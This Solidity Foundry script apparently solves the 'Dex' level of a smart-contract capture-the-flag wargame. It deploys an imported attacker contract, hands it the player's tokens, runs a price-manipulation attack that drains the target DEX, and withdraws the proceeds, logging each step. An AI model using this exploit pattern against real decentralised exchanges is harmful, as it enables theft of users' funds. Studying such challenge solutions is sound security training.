// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../../../src/levels/22_Dex/DexAttacker.sol";
import "../../../src/levels/22_Dex/Dex.sol";

contract DexAttackerScript is Script {
    function run() external {
        // Get DEX instance address from environment
        address dexAddress = vm.envAddress("DEX_TARGET");

        console.log("========================================");
        console.log("DEX Price Manipulation Attack");
        console.log("========================================");
        console.log("DEX Address:", dexAddress);

        IDex dex = IDex(dexAddress);
        address token1 = dex.token1();
        address token2 = dex.token2();

        console.log("\nToken Addresses:");
        console.log("Token1:", token1);
        console.log("Token2:", token2);

        vm.startBroadcast();
        address player = msg.sender;

        // Display initial balances
        console.log("\n--- INITIAL STATE ---");
        console.log("Player address:", player);
        uint256 playerT1Initial = dex.balanceOf(token1, player);
        uint256 playerT2Initial = dex.balanceOf(token2, player);
        console.log("Player Token1 balance:", playerT1Initial);
        console.log("Player Token2 balance:", playerT2Initial);
        console.log("DEX Token1 balance:", dex.balanceOf(token1, dexAddress));
        console.log("DEX Token2 balance:", dex.balanceOf(token2, dexAddress));

        // Deploy attacker contract
        console.log("\n--- DEPLOYING ATTACKER ---");
        DexAttacker attacker = new DexAttacker(dexAddress);
        console.log("DexAttacker deployed at:", address(attacker));

        // Transfer initial tokens from player to attacker
        console.log("\n--- TRANSFERRING TOKENS TO ATTACKER ---");

        if (playerT1Initial > 0) {
            IERC20(token1).transfer(address(attacker), playerT1Initial);
            console.log("Transferred", playerT1Initial, "token1 to attacker");
        }

        if (playerT2Initial > 0) {
            IERC20(token2).transfer(address(attacker), playerT2Initial);
            console.log("Transferred", playerT2Initial, "token2 to attacker");
        }

        // Execute attack
        console.log("\n--- EXECUTING ATTACK ---");
        console.log("Starting price manipulation attack...");
        attacker.attack();
        console.log("Attack completed!");

        // Withdraw tokens back to player
        console.log("\n--- WITHDRAWING TOKENS ---");
        attacker.withdrawTokens();
        console.log("Tokens withdrawn to player");

        vm.stopBroadcast();

        // Verify success
        console.log("\n--- FINAL STATE ---");
        console.log("DEX Token1 balance:", dex.balanceOf(token1, dexAddress));
        console.log("DEX Token2 balance:", dex.balanceOf(token2, dexAddress));

        uint256 dexT1Final = dex.balanceOf(token1, dexAddress);
        uint256 dexT2Final = dex.balanceOf(token2, dexAddress);

        if (dexT1Final == 0 || dexT2Final == 0) {
            console.log("\n SUCCESS! DEX has been drained!");
        } else {
            console.log("\n FAILED! DEX still has both tokens.");
        }

        console.log("\nFinal Player balances:");
        console.log("Player Token1:", IERC20(token1).balanceOf(player));
        console.log("Player Token2:", IERC20(token2).balanceOf(player));
        console.log("========================================");
    }
}
